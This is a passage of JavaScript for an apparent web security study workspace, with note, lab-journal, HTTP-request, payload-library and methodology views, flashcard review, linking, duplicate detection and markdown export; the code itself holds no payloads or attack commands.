    var k = lower(n.title);
    if(!k) return [];
    return V.notes.filter(function(o){ return o !== n && scan(o).links.some(function(l){ return lower(l) === k; }); });
  }
  function connected(n){ return scan(n).links.length || n.rels.length || relsIn(n).length || backlinks(n).length; }
  function liveCards(){
    var out = [], seen = {};
    V.notes.forEach(function(n){
      scan(n).cards.forEach(function(c){
        var id = cardKey(n.id, c.f);
        if(seen[id]) return; seen[id] = 1;
        out.push({ id:id, f:c.f, b:c.b, note:n, st:V.cards[id] || null });
      });
    });
    return out;
  }
  function queueInfo(cards){
    var t = today(), due = [], fresh_ = [], intro = 0;
    cards.forEach(function(c){
      if(!c.st) fresh_.push(c);
      else{ if(c.st.due <= t) due.push(c); if(c.st.f === t) intro++; }
    });
    due.sort(function(a, b){ return a.st.due < b.st.due ? -1 : a.st.due > b.st.due ? 1 : 0; });
    var revise = V.notes.filter(function(n){ return n.rev && n.rev.due <= t; });
    return { due:due, fresh:fresh_.slice(0, Math.max(0, NEW_PER_DAY - intro)), freshAll:fresh_.length, revise:revise };
  }
  var idxCache = { sig:"", vecs:null };
  function index(){
    var sig = V.notes.length + ":" + V.notes.reduce(function(m, n){ return Math.max(m, n.updatedAt); }, 0);
    if(idxCache.sig !== sig){ idxCache = { sig:sig, vecs:buildIndex(V.notes) }; }
    return idxCache.vecs;
  }
  function related(n, k){
    var vecs = index(), me = vecs[n.id] || {}, near = {};
    relsOut(n).concat(relsIn(n)).forEach(function(r){ near[r.n.id] = 1; });
    backlinks(n).forEach(function(o){ near[o.id] = 1; });
    scan(n).links.forEach(function(t){ var o = byTitle(t); if(o) near[o.id] = 1; });
    var mt = tagsOf(n);
    return V.notes.filter(function(o){ return o !== n && o.type !== "capture"; }).map(function(o){
      var s = cosine(me, vecs[o.id] || {});
      if(n.mod && o.mod === n.mod) s += 0.04;
      return { n:o, s:s, linked:!!near[o.id], shared:tagsOf(o).filter(function(t){ return mt.indexOf(t) >= 0; }) };
    }).filter(function(x){ return x.s > 0.12; }).sort(function(a, b){ return b.s - a.s; }).slice(0, k || 6);
  }
  // every pair is compared, so the answer is kept until an entry changes
  var dupCache = { sig:"", out:null };
  function duplicates(limit){
    var vecs = index();
    if(dupCache.sig === idxCache.sig) return dupCache.out.slice(0, limit || 8);
    var list = V.notes.filter(function(n){ return n.type !== "capture" && (n.body.trim() || (n.pay && n.pay.code.trim())); }), out = [];
    for(var i = 0; i < list.length; i++) for(var j = i + 1; j < list.length; j++){
      var a = list[i], b = list[j];
      if(a.type !== b.type) continue;
      var same = a.type === "payload" && a.pay.code.trim() && a.pay.code.trim() === b.pay.code.trim();
      var s = same ? 1 : cosine(vecs[a.id] || {}, vecs[b.id] || {});
      if(s >= 0.72 || (lower(a.title) && lower(a.title) === lower(b.title))) out.push({ a:a, b:b, s:s });
    }
    dupCache = { sig:idxCache.sig, out:out.sort(function(x, y){ return y.s - x.s; }) };
    return dupCache.out.slice(0, limit || 8);
  }
  function chainOf(n){
    function walk(x, dir, seen, d){
      var best = [x];
      if(d >= 6) return best;
      var next = dir > 0 ? relsOut(x).filter(function(r){ return r.t === "leads"; }) : relsIn(x).filter(function(r){ return r.t === "leads"; });
      next.slice(0, 8).forEach(function(r){
        if(seen[r.n.id]) return;
        seen[r.n.id] = 1;
        var p = [x].concat(walk(r.n, dir, seen, d + 1));
        delete seen[r.n.id];
        if(p.length > best.length) best = p;
      });
      return best;
    }
    var s = {}; s[n.id] = 1;
    var back = walk(n, -1, s, 0).reverse(), fwd = walk(n, 1, s, 0);
    return back.concat(fwd.slice(1));
  }

  // ----- changes -----
  function touch(){ var t = today(), a = V.act[t]; if(!a || !a.e) V.act[t] = { e:1, r:a ? a.r : 0, ok:a ? a.ok || 0 : 0 }; }
  function edited(n){ n.updatedAt = Date.now(); delete n.seed; touch(); }
  function commit(){ ctx.save(); draw(); }
  function storeImage(data){ var id = "i" + Math.random().toString(36).slice(2, 10); V.imgs[id] = data; return id; }
  function openEntry(n, focusBody){
    u.tab = TYPE_TAB[n.type] || "notes"; u.sel[n.type] = n.id; u.showEd = true;
    draw();
    window.scrollTo(0, Math.min(window.scrollY, root.getBoundingClientRect().top + window.scrollY - 10));
    if(focusBody){ var ta = root.querySelector(".vt-ta"); if(ta){ ta.focus(); ta.setSelectionRange(ta.value.length, ta.value.length); } }
  }
  function newEntry(type, o){
    o = o || {};
    var n = entry(type, str(o.title, 200), o.body != null ? o.body : tplBody(type, o.tpl), o.extra);
    if(o.mod) n.mod = o.mod;
    if(o.rels) n.rels = o.rels;
    V.notes.push(n); touch();
    u.tab = TYPE_TAB[type]; u.sel[type] = n.id; u.showEd = true;
    if(u.mode === "read") u.mode = "split";
    commit();
    var el = root.querySelector(n.title ? (type === "payload" ? ".vt-code-in" : type === "http" ? ".vt-req" : ".vt-ta") : ".vt-title");
    if(el){ el.focus(); if(el.setSelectionRange) el.setSelectionRange(0, 0); }
    return n;
  }
  function newIn(tab, anchor){
    var type = TAB_TYPE[tab] || "note";
    if(type === "capture"){ capture(); return; }
    newEntry(type, {});
  }
  function followLink(t){ var n = byTitle(t); if(n) openEntry(n); else newEntry("note", { title:t, tpl:"blank" }); }
  function removeEntry(n){
    scan(n).cards.forEach(function(c){ delete V.cards[cardKey(n.id, c.f)]; });
    V.notes = V.notes.filter(function(x){ return x !== n; });
    V.notes.forEach(function(o){ o.rels = o.rels.filter(function(r){ return r.id !== n.id; }); });
    if(u.sel[n.type] === n.id) u.sel[n.type] = "";
  }
  function duplicate(n){
    var c = JSON.parse(JSON.stringify(n));
    c.id = rid(n.type.charAt(0)); c.title = (n.title || "untitled") + " (copy)"; c.createdAt = c.updatedAt = Date.now();
    delete c.seed; delete c.rev; c.pinned = false;
    if(c.runs) c.runs = [];
    V.notes.push(c); touch();
    u.sel[c.type] = c.id; commit();
  }
  function retype(n, type, extra){
    n.type = type; ensureFields(n);
    if(extra) Object.keys(extra).forEach(function(k){ n[k] = extra[k]; });
    edited(n);
  }
  // exported markdown carries its screenshots inline, so it still shows them
  // outside this site; importing turns them back into stored screenshots
  function withImages(text){ return text.replace(/\]\(img:(i[a-z0-9]{4,20})\)/g, function(m, id){ return V.imgs[id] ? "](" + V.imgs[id] + ")" : m; }); }
  function takeImages(text){
    return text.replace(/\]\((data:image\/(?:png|jpeg|webp|gif);base64,[A-Za-z0-9+\/=]+)\)/g, function(m, data){ return IMG_OK.test(data) ? "](img:" + storeImage(data) + ")" : m; });
  }
  function exportOne(n){
    var extra = n.type === "payload" ? "\n\n" + F + n.pay.lang + "\n" + n.pay.code + "\n" + F
      : n.type === "http" ? "\n\n" + F + "http\n" + n.http.req + "\n" + F + "\n\n" + F + "http\n" + n.http.res + "\n" + F : "";
    return withImages(n.body + extra);
  }
  function exportAll(){
    var out = V.notes.filter(function(n){ return n.type !== "capture"; }).map(function(n){ return "# " + name(n) + "\n\n" + exportOne(n); }).join("\n\n---\n\n");
    download("cwes-workspace-" + today() + ".md", out + "\n");
  }
  function importFiles(files){
    var list = Array.prototype.slice.call(files || []), left = list.length, got = [];
    if(!left) return;
    list.forEach(function(f){
      var r = new FileReader();
      r.onload = function(){ got.push({ name:f.name, text:String(r.result || "") }); if(--left === 0) finish(); };
      r.onerror = function(){ if(--left === 0) finish(); };
      r.readAsText(f);
    });
    function finish(){
      var last = null;
      got.forEach(function(g, i){
        var title = g.name.replace(/\.(md|markdown|txt)$/i, ""), base = title, k = 2;
        while(byTitle(title)) title = base + " (" + (k++) + ")";
        last = entry("note", title.slice(0, 200), takeImages(g.text.replace(/\r\n?/g, "\n")));
        last.createdAt = last.updatedAt = Date.now() + i;
        V.notes.push(last);
      });
      if(!last) return;
      touch(); u.tab = "notes"; u.sel.note = last.id; u.flash = "imported " + plural(got.length, "file");
      commit();
    }
  }

  // ----- frame -----
  var cards = [], Q = null;
  function draw(){
    stopGraph(); closeMenus();
    cards = liveCards(); Q = queueInfo(cards);
    root.innerHTML = "";
    root.appendChild(bar());
    var body = h("div", { class:"vt-body" });
    root.appendChild(body);
    var fn = { home:home, inbox:inbox, review:review, roadmap:roadmap, graph:graphTab }[u.tab];
    if(fn) fn(body); else library(body, TAB_TYPE[u.tab] || "note");
    datalists();
    u.flash = "";
  }
  function bar(){
    var nIn = ofType("capture").length, nRev = Q.due.length + Q.fresh.length + Q.revise.length;
    function count(t){ return t === "inbox" ? nIn : t === "review" ? nRev : 0; }
    return h("div", { class:"vt-bar" }, [
      h("div", { class:"vt-tabs", role:"tablist" }, TABS.map(function(t, i){
        var c = count(t);
        return h("button", { type:"button", role:"tab", class:"vt-tab" + (u.tab === t ? " on" : "") + (c ? " due" : ""),
          "aria-selected":u.tab === t ? "true" : "false", title:"Alt+" + ((i + 1) % 10), text:t + (c ? " " + c : ""),
          onclick:function(){ go(t); } });
      })),
      h("div", { class:"vt-acts" }, [
        h("button", { type:"button", class:"vt-link" + (LY.nolist ? "" : " on"), text:"list", title:"show or hide the list (Alt+\\)", onclick:function(){ toggleList(); } }),
        h("button", { type:"button", class:"vt-link" + (LY.focus ? " on" : ""), text:"focus", title:"hide the site sidebar (Alt+M)", onclick:function(){ toggleFocus(); } }),
        h("button", { type:"button", class:"vt-link", text:"keys", title:"keyboard shortcuts (?)", onclick:function(e){ keysMenu(e.currentTarget); } }),
        h("button", { type:"button", class:"vt-btn", title:"search everything (Ctrl+K)", text:"search ⌃K", onclick:function(){ palette(); } }),
        h("button", { type:"button", class:"vt-btn", title:"quick capture, from any page (Alt+C)", text:"capture", onclick:function(){ capture(); } }),
        h("button", { type:"button", class:"vt-btn vt-primary", title:"Alt+N", text:"+ " + (TAB_TYPE[u.tab] ? TYPE_WORD[TAB_TYPE[u.tab]] : "new"),
          onclick:function(e){ if(TAB_TYPE[u.tab]) newIn(u.tab, e.currentTarget); else newMenu(e.currentTarget); } })
      ])
    ]);
  }
  function go(t){ u.tab = t; if(t !== "review") u.review = null; u.showEd = false; draw(); }
  function toggleList(){ LY.nolist = !LY.nolist; saveLayout(LY); draw(); }
  function toggleFocus(){ LY.focus = !LY.focus; saveLayout(LY); document.body.classList.toggle("vt-focus", !!LY.focus); draw(); }
  function newMenu(anchor){
    openMenu(anchor, [["note", "notes"], ["lab", "labs"], ["http", "http"], ["payload", "payloads"], ["method", "methods"]].map(function(x){
      return h("button", { type:"button", class:"vt-mi", onclick:function(){ closeMenus(); newIn(x[1], anchor); } }, [h("b", { text:TYPE_WORD[x[0]] })]);
    }));
  }
  function keysMenu(anchor){
    var rows = [["Ctrl+K", "search everything"], ["Alt+C", "quick capture (any page)"], ["Alt+N", "new entry in this tab"], ["Alt+1 … Alt+0", "switch tabs"],
      ["Alt+\\", "show or hide the list"], ["Alt+M", "focus mode"], ["Ctrl+E", "edit / split / read"], ["Ctrl+B, Ctrl+I", "bold, italic"],
      ["[[", "link an entry"], ["paste, drop", "add a screenshot"], ["space, 1-4", "review: show, grade"], ["Ctrl+Z", "undo"]];
    openMenu(anchor, [h("div", { class:"vt-keys" }, rows.map(function(r){ return h("div", {}, [h("kbd", { text:r[0] }), h("span", { text:r[1] })]); }))]);
  }
  function section(title, kids, extra){
    return h("section", { class:"vt-sec" }, [h("div", { class:"vt-shead" }, [h("h3", { class:"vt-sh", text:title }), extra || null])].concat(kids));
  }
  function confBar(m, onSet){
    var wrap = h("span", { class:"vt-conf", title:"how sure you feel: " + m.conf + "/5" });
    for(var i = 1; i <= 5; i++) (function(i){
      wrap.appendChild(h(onSet ? "button" : "i", { type:onSet ? "button" : null, class:"vt-cf" + (i <= m.conf ? " on" : ""),
        "aria-label":onSet ? "confidence " + i : null, onclick:onSet ? function(){ onSet(m.conf === i ? i - 1 : i); } : null }));
    })(i);
    return wrap;
  }
  function targetBar(){
    var keys = VAR_KEYS.slice(), seen = {};
    keys.forEach(function(k){ seen[k] = 1; });
    V.notes.forEach(function(n){
      (n.body + (n.pay ? n.pay.code : "")).replace(VAR_RE, function(m, k){ if(!seen[k]){ seen[k] = 1; keys.push(k); } return m; });
    });
    return h("div", { class:"vt-target" }, [h("span", { class:"vt-tlabel", text:"target" })].concat(keys.slice(0, 14).map(function(k){
      var inp = h("input", { class:"vt-tin", value:V.vars[k] || "", placeholder:VAR_HINT[k] || "", spellcheck:"false", "data-native-undo":"", "aria-label":k });
      function width(){ inp.style.width = Math.max(5, (inp.value || inp.placeholder).length + 1) + "ch"; }
      inp.addEventListener("input", function(){
        var v = inp.value.trim();
        if(v) V.vars[k] = v.slice(0, 500); else delete V.vars[k];
        ctx.save(); width();
        root.querySelectorAll('.vt-ph[data-v="' + k + '"]').forEach(function(s){ s.textContent = v || "{{" + k + "}}"; s.classList.toggle("empty", !v); });
      });
      width();
      return h("label", { class:"vt-tvar" }, [h("span", { text:k }), inp]);
    })));
  }
  function codeCard(code, lang, title, R){ return h("div", { class:"vt-md", html:codeHtml(code, lang, title || "", R) }); }
  function wireCopy(el, R){ el.addEventListener("click", function(e){ var b = e.target.closest(".vt-copy"); if(b) copyBtn(b, fill(R.codes[+b.getAttribute("data-code")], V.vars)); }); }

  // ===== LIBRARY: list + entry, for notes, labs, http, payloads, methods =====
  var listEl = null;
  function filtered(type){
    var q = lower(u.q[type] || "");
    return ofType(type).filter(function(n){
      if(u.mod && n.mod !== u.mod) return false;
      if(u.tag && tagsOf(n).indexOf(u.tag) < 0) return false;
      if(type === "lab" && u.lstat && n.lab.status !== u.lstat) return false;
      if(type === "payload" && u.pcat && n.pay.cat !== u.pcat) return false;
      if(q){
        var hay = (n.title + "\n" + n.body + (n.pay ? "\n" + n.pay.code : "") + (n.http ? "\n" + n.http.req + "\n" + n.http.res : "") + (n.lab ? "\n" + n.lab.platform : "")).toLowerCase();
        if(hay.indexOf(q) < 0) return false;
      }
      return true;
    }).sort(function(a, b){ return (b.pinned - a.pinned) || (b.updatedAt - a.updatedAt); });
  }
  function rowMeta(n){
    var m = modById(n.mod), S = scan(n);
    if(n.type === "lab") return [n.lab.platform, n.lab.diff, n.lab.date].filter(Boolean).join(" · ") || "no details yet";
    if(n.type === "payload") return n.pay.cat + " · " + n.pay.lang;
    if(n.type === "http"){ var rq = parseReq(n.http.req), rs = parseRes(n.http.res); return [rq.host, rs.ok ? rs.status : ""].filter(Boolean).join(" · ") || "empty"; }
    if(n.type === "method") return plural(S.checks.length, "step") + (n.runs.length ? " · " + plural(n.runs.length, "run") : "");
    return [ago(n.updatedAt), S.cards.length ? plural(S.cards.length, "card") : "", m && !u.mod ? m.name : ""].filter(Boolean).join(" · ");
  }
  function row(n){
    var sel = u.sel[n.type] === n.id;
    var r = h("div", { class:"vt-row" + (sel ? " on" : ""), role:"button", tabindex:"0", "data-id":n.id,
      onclick:function(){ openEntry(n); }, onkeydown:function(e){ if(e.key === "Enter") openEntry(n); } }, [
      h("span", { class:"vt-rt" }, [
        n.type === "lab" ? h("i", { class:"vt-lst s-" + n.lab.status.replace(" ", "-"), title:n.lab.status }) : null,
        n.pinned ? h("i", { class:"vt-pin", title:"pinned" }) : null,
        n.rev ? h("i", { class:"vt-revdot", title:"marked for revision" }) : null,
        h("span", { class:"vt-rtt", text:name(n) })
      ]),
      h("small", { text:rowMeta(n) })
    ]);
    if(n.type === "payload"){
      var cb = h("button", { type:"button", class:"vt-copy vt-rcopy", text:"copy", onclick:function(e){ e.stopPropagation(); copyBtn(cb, fill(n.pay.code, V.vars)); } });
      r.appendChild(cb);
    }
    return r;
  }
  function renderList(type){
    if(!listEl) return;
    listEl.innerHTML = "";
    var list = filtered(type);
    if(!list.length){ listEl.appendChild(h("p", { class:"vt-muted vt-small", text:ofType(type).length ? "nothing matches." : "nothing here yet." })); return; }
    if(type !== "note" || u.q.note || u.tag || u.mod){ list.forEach(function(n){ listEl.appendChild(row(n)); }); return; }
    var pinned = list.filter(function(n){ return n.pinned; });
    if(pinned.length){ listEl.appendChild(h("div", { class:"vt-grp", text:"pinned" })); pinned.forEach(function(n){ listEl.appendChild(row(n)); }); }
    V.modules.forEach(function(m){
      var ns = list.filter(function(n){ return !n.pinned && n.mod === m.id; });
      if(!ns.length) return;
      listEl.appendChild(h("div", { class:"vt-grp", text:m.name }));
      ns.forEach(function(n){ listEl.appendChild(row(n)); });
    });
    var rest = list.filter(function(n){ return !n.pinned && !modById(n.mod); });
    if(rest.length){ listEl.appendChild(h("div", { class:"vt-grp", text:"other" })); rest.forEach(function(n){ listEl.appendChild(row(n)); }); }
  }
  function library(body, type){
    var sel = u.sel[type] ? noteById(u.sel[type]) : null;
    if(sel && sel.type !== type) sel = null;
    if(!sel && type === "note" && u.sel.note == null){
      sel = filtered("note")[0] || null;
      if(sel) u.sel.note = sel.id;
    }
    var wrap = h("div", { class:"vt-lib" + (LY.nolist ? " nolist" : "") + (u.showEd && sel ? " show-ed" : "") });
    var search = h("input", { class:"vt-in vt-filter", type:"search", placeholder:"filter " + TYPE_WORD[type] + "s", value:u.q[type] || "", spellcheck:"false", "data-native-undo":"",
      oninput:function(){ u.q[type] = search.value; renderList(type); } });
    var chips = [];
    if(u.mod){ var mm = modById(u.mod); if(mm) chips.push(h("button", { type:"button", class:"vt-chip on", text:mm.name + " ×", onclick:function(){ u.mod = ""; draw(); } })); else u.mod = ""; }
    if(u.tag) chips.push(h("button", { type:"button", class:"vt-chip on", text:"#" + u.tag + " ×", onclick:function(){ u.tag = ""; draw(); } }));
    if(type === "lab") LAB_STATUS.forEach(function(s){
      var c = ofType("lab").filter(function(n){ return n.lab.status === s; }).length;
      if(c) chips.push(h("button", { type:"button", class:"vt-chip" + (u.lstat === s ? " on" : ""), text:s + " " + c, onclick:function(){ u.lstat = u.lstat === s ? "" : s; draw(); } }));
    });
    if(type === "payload") PAY_CATS.forEach(function(c){
      var k = ofType("payload").filter(function(n){ return n.pay.cat === c; }).length;
      if(k) chips.push(h("button", { type:"button", class:"vt-chip" + (u.pcat === c ? " on" : ""), text:c + " " + k, onclick:function(){ u.pcat = u.pcat === c ? "" : c; draw(); } }));
    });
    if(type === "note" && !u.tag){
      var tc = {};
      ofType("note").forEach(function(x){ tagsOf(x).forEach(function(t){ tc[t] = (tc[t] || 0) + 1; }); });
      Object.keys(tc).sort(function(a, b){ return tc[b] - tc[a]; }).slice(0, 10).forEach(function(t){
        chips.push(h("button", { type:"button", class:"vt-chip", text:"#" + t, onclick:function(){ u.tag = t; draw(); } }));
      });
    }
    listEl = h("div", { class:"vt-rows" });
    var file = h("input", { type:"file", accept:".md,.markdown,.txt,text/markdown,text/plain", multiple:true, hidden:true, onchange:function(){ importFiles(file.files); file.value = ""; } });
    var side = h("aside", { class:"vt-side" }, [
      search,
      chips.length ? h("div", { class:"vt-chips" }, chips) : null,
      type !== "note" ? h("button", { type:"button", class:"vt-link vt-overview-link" + (sel ? "" : " on"), text:"overview", onclick:function(){ u.sel[type] = ""; u.showEd = false; draw(); } }) : null,
      listEl,
      type === "note" ? h("div", { class:"vt-sidefoot" }, [
        h("button", { type:"button", class:"vt-link", text:"import .md", title:"add markdown files (from Obsidian, say) as notes", onclick:function(){ file.click(); } }),
        h("button", { type:"button", class:"vt-link", text:"export all", title:"every entry in one markdown file", onclick:exportAll }), file
      ]) : null
    ]);
    var main = h("section", { class:"vt-ed" });
    wrap.appendChild(side); wrap.appendChild(main);
    body.appendChild(wrap);
    renderList(type);
    if(sel) editor(main, sel);
    else ({ note:notesHome, lab:labsHome, http:httpHome, payload:payloadsHome, method:methodsHome }[type])(main);
  }

  // ----- overview panes (nothing selected) -----
  function empty(title, text, kids){ return h("div", { class:"vt-empty" }, [h("b", { text:title }), h("span", { text:text })].concat(kids || [])); }
  function notesHome(main){
    var some = filtered("note").length;
    main.appendChild(empty(some ? "pick a note" : "no notes here yet", (some ? "choose one on the left, or start a new one. " : "") + "templates: vulnerability, technique, module notes, finding, cheat sheet.",
      [h("button", { type:"button", class:"vt-btn vt-primary", text:"+ note", onclick:function(){ newEntry("note", { mod:u.mod }); } })]));
  }
  function labsHome(main){
    var labs = ofType("lab"), solved = labs.filter(function(n){ return n.lab.status === "solved"; });
    var mins = labs.reduce(function(s, n){ return s + n.lab.mins; }, 0);
    main.appendChild(h("div", { class:"stats vt-stats" }, [
      h("span", { class:"count" }, [h("b", { text:String(solved.length) }), " solved"]),
      h("span", { class:"right" }, ["in progress", "stuck", "todo"].map(function(s){
        return h("span", {}, [s + " ", h("b", { text:String(labs.filter(function(n){ return n.lab.status === s; }).length) })]);
      }).concat([h("span", {}, ["time ", h("b", { text:hm(mins) })])]))
    ]));
    if(!labs.length){ main.appendChild(empty("no labs yet", "log every lab you do: platform, the vulnerability, what you tried, what worked, and the root cause.",
      [h("button", { type:"button", class:"vt-btn vt-primary", text:"+ lab", onclick:function(){ newEntry("lab", {}); } })])); return; }
    // what each solved lab practised
    var by = {};
    solved.forEach(function(n){ relsOut(n).filter(function(r){ return r.t === "practises"; }).forEach(function(r){ by[r.n.id] = by[r.n.id] || { n:r.n, c:0 }; by[r.n.id].c++; }); });
    var practised = Object.keys(by).map(function(k){ return by[k]; }).sort(function(a, b){ return b.c - a.c; });
    var plat = {};
    solved.forEach(function(n){ var k = n.lab.platform || "other"; plat[k] = (plat[k] || 0) + 1; });
    main.appendChild(h("div", { class:"vt-two" }, [
      section("practised", [practised.length ? h("div", {}, practised.map(function(x){
        return h("button", { type:"button", class:"vt-wrow", onclick:function(){ openEntry(x.n); } }, [h("span", { class:"vt-wname", text:name(x.n) }), h("b", { text:plural(x.c, "lab") })]);
      })) : h("p", { class:"vt-muted vt-small", text:"set what a lab practises (its relations) and solved labs show up here per vulnerability." })]),
      section("platforms", [Object.keys(plat).length ? h("div", {}, Object.keys(plat).sort(function(a, b){ return plat[b] - plat[a]; }).map(function(k){
        return h("div", { class:"vt-wrow vt-static" }, [h("span", { class:"vt-wname", text:k }), h("b", { text:String(plat[k]) })]);
      })) : h("p", { class:"vt-muted vt-small", text:"nothing solved yet." })])
    ]));
    var tbl = h("table", { class:"vt-table vt-labs" }, [h("thead", {}, [h("tr", {}, ["lab", "platform", "level", "status", "date", "time"].map(function(c){ return h("th", { text:c }); }))]),
      h("tbody", {}, labs.slice().sort(function(a, b){ return (b.lab.date || "") < (a.lab.date || "") ? -1 : (b.lab.date || "") > (a.lab.date || "") ? 1 : b.updatedAt - a.updatedAt; }).map(function(n){
        return h("tr", { class:"s-" + n.lab.status.replace(" ", "-"), onclick:function(){ openEntry(n); } }, [
          h("td", { text:name(n) }), h("td", { text:n.lab.platform }), h("td", { text:n.lab.diff }), h("td", { class:"vt-lstat", text:n.lab.status }),
          h("td", { text:n.lab.date }), h("td", { text:n.lab.mins ? hm(n.lab.mins) : "" })]);
      }))]);
    main.appendChild(section("journal", [h("div", { class:"vt-twrap" }, [tbl])]));
  }
  function httpHome(main){
    var ta = h("textarea", { class:"vt-in vt-paste", rows:"10", spellcheck:"false", "data-native-undo":"",
      placeholder:"paste a raw request from Burp (right-click, copy request). Paste the response under it too if you have it: it starts at the line beginning with HTTP/." });
    function make(){
      var raw = ta.value.replace(/\r\n?/g, "\n");
      if(!raw.trim()) { ta.focus(); return; }
      var m = /\n(HTTP\/[\d.]+ \d{3}[^\n]*\n)/.exec(raw), req = m ? raw.slice(0, m.index) : raw, res = m ? raw.slice(m.index + 1) : "";
      var rq = parseReq(req);
      newEntry("http", { title:rq.ok ? rq.method + " " + rq.path.slice(0, 80) : "", body:tplBody("http"), extra:{ http:{ req:req.replace(/\n+$/, "\n"), res:res, ann:{} } } });
    }
    main.appendChild(section("new request", [ta, h("div", { class:"vt-row-acts" }, [h("button", { type:"button", class:"vt-btn vt-primary", text:"analyse", onclick:make })])]));
    main.appendChild(h("p", { class:"vt-muted vt-small", text:"each request lists its parameters, headers and cookies, lets you annotate any of them, and points out leads: parameters reflected in the response, cookies without flags, ids worth changing, URLs worth pointing elsewhere, errors, JWTs. leads are things to test, not proof." }));
  }
  function payloadsHome(main){
    var all = [], R = rctx("");
    ofType("payload").forEach(function(n){ if(n.pay.code.trim()) all.push({ n:n, code:n.pay.code, lang:n.pay.lang, title:name(n), cat:n.pay.cat, desc:n.body }); });
    if(u.pcode) V.notes.forEach(function(n){ if(n.type === "payload" || n.type === "capture") return; scan(n).code.forEach(function(c){ if(c.code.trim()) all.push({ n:n, code:c.code, lang:c.lang, title:c.title || c.head || name(n), cat:"from " + TYPE_WORD[n.type], desc:"" }); }); });
    var q = h("input", { class:"vt-in vt-filter", type:"search", placeholder:"search payloads and commands", value:u.pq, spellcheck:"false", "data-native-undo":"", oninput:function(){ u.pq = q.value; paint(); } });
    var count = h("span", { class:"vt-muted vt-small" });
    main.appendChild(targetBar());
    main.appendChild(h("div", { class:"vt-filters" }, [q,
      h("label", { class:"vt-opt" }, [h("input", { type:"checkbox", checked:u.pcode ? true : null, onchange:function(e){ u.pcode = e.target.checked; draw(); } }), "include code from notes and labs"]), count]));
    var out = h("div", { class:"vt-ars" });
    main.appendChild(out);
    function paint(){
      var s = lower(u.pq);
      var list = all.filter(function(x){ return (!u.pcat || x.cat === u.pcat) && (!s || (x.code + "\n" + x.title + "\n" + x.desc).toLowerCase().indexOf(s) >= 0); });
      count.textContent = list.length + " of " + all.length;
      out.innerHTML = ""; R = rctx("");
      if(!all.length){ out.appendChild(empty("no payloads yet", "save payloads and commands here, or capture them with Alt+C. code blocks from your notes show up here too.")); return; }
      list.slice(0, 300).forEach(function(x){
        out.appendChild(h("div", { class:"vt-arsi" }, [
          h("div", { class:"vt-arsh" }, [h("b", { text:x.title }), h("span", { class:"vt-muted vt-small", text:x.cat }),
            h("button", { type:"button", class:"vt-link", text:x.n.type === "payload" ? "edit" : name(x.n), onclick:function(){ openEntry(x.n); } })]),
          codeCard(x.code, x.lang, "", R),
          x.desc ? h("div", { class:"vt-md vt-ardesc", html:render(x.desc, rctx(x.n.id)) }) : null
        ]));
      });
    }
    wireCopy(out, { get codes(){ return R.codes; } });
    paint();
  }
  function methodsHome(main){
    var ms = ofType("method");
    if(!ms.length){ main.appendChild(empty("no methodologies yet", "a methodology is a checklist you run against every target: recon, then one per vulnerability class.",
      [h("button", { type:"button", class:"vt-btn vt-primary", text:"+ methodology", onclick:function(){ newEntry("method", {}); } })])); return; }
    main.appendChild(h("div", { class:"vt-mgrid" }, ms.map(function(n){
      var S = scan(n), last = n.runs[n.runs.length - 1], done = last ? S.checks.filter(function(c){ return last.ticks.indexOf(c.key) >= 0; }).length : 0;
      return h("button", { type:"button", class:"vt-mcard", onclick:function(){ openEntry(n); } }, [
        h("b", { text:name(n) }), h("small", { text:plural(S.checks.length, "step") + " · " + plural(n.runs.length, "run") }),
        last ? h("div", { class:"vt-mrun" }, [h("span", { text:(last.target || "untitled run") + " · " + done + "/" + S.checks.length }),
          h("div", { class:"vt-pbar" }, [h("i", { style:"width:" + (S.checks.length ? done / S.checks.length * 100 : 0) + "%" })])]) : null
      ]);
    })));
  }

  // ===== THE ENTRY EDITOR (every type) =====
  function editor(ed, n){
    ensureFields(n);
    var R = null, prevTimer = null, metaTimer = null, titleAtFocus = n.title;
    var paintRunProgress = function(){};       // set by runBar() for a methodology run
    var run = n.type === "method" ? n.runs.filter(function(r){ return r.id === u.run[n.id]; })[0] || null : null;
    var mode = run && u.mode === "edit" ? "split" : u.mode;
    var imgIn = h("input", { type:"file", accept:"image/*", multiple:true, hidden:true, onchange:function(){ var fs = Array.prototype.slice.call(imgIn.files); imgIn.value = ""; readImages(fs, insertImage); } });
    var modSel = h("select", { class:"vt-in vt-sel", "aria-label":"module", onchange:function(){ n.mod = modSel.value; edited(n); ctx.save(); renderList(n.type); } },
      [h("option", { value:"", text:"no module" })].concat(V.modules.map(function(m){ return h("option", { value:m.id, text:m.name }); })));
    modSel.value = n.mod || "";
    var modes = h("div", { class:"vt-toggle" }, ["edit", "split", "read"].map(function(m){
      return h("button", { type:"button", class:"vt-tog" + (mode === m ? " on" : ""), text:m, title:"Ctrl+E", onclick:function(){ setMode(m); } });
    }));
    var del = armed(h("button", { type:"button", class:"vt-link", text:"delete" }), "sure?", function(){ removeEntry(n); u.showEd = false; commit(); });
    var acts = [];
    if(n.type === "lab"){
      acts.push(h("button", { type:"button", class:"vt-link vt-act", text:"→ technique note", title:"write this lab up as a reusable technique note", onclick:function(){ labToNote(n); } }));
      acts.push(h("button", { type:"button", class:"vt-link vt-act", text:"→ payloads", title:"save this lab's code blocks to the payload library", onclick:function(){ labPayloads(n); } }));
    }
    if(n.type === "capture"){
      acts.push(h("button", { type:"button", class:"vt-link vt-act", text:"→ note", onclick:function(){ fileCapture(n, "note"); } }));
      acts.push(h("button", { type:"button", class:"vt-link vt-act", text:"→ payload", onclick:function(){ fileCapture(n, "payload"); } }));
    }
    ed.appendChild(h("div", { class:"vt-edbar" }, [
      h("button", { type:"button", class:"vt-link vt-back", text:"‹ list", onclick:function(){ u.showEd = false; draw(); } }),
      h("span", { class:"vt-badge t-" + n.type, text:TYPE_WORD[n.type] }),
      modSel,
      h("button", { type:"button", class:"vt-link" + (n.pinned ? " on" : ""), text:n.pinned ? "pinned" : "pin", onclick:function(){ n.pinned = !n.pinned; commit(); } }),
      h("button", { type:"button", class:"vt-link" + (n.rev ? " on" : ""), text:n.rev ? "revising" : "revise", title:n.rev ? "on the revision schedule, next " + n.rev.due + ". click to take it off" : "put this on the spaced revision schedule",
        onclick:function(){ if(n.rev) delete n.rev; else n.rev = { b:0, due:today(), n:0, l:0 }; commit(); } }),
      modes
    ].concat(acts).concat([
      h("span", { class:"vt-grow" }),
      h("button", { type:"button", class:"vt-link", text:"copy", title:"make a copy", onclick:function(){ duplicate(n); } }),
      h("button", { type:"button", class:"vt-link", text:"export", title:"download as markdown", onclick:function(){ download(name(n) + ".md", exportOne(n)); } }),
      del
    ])));
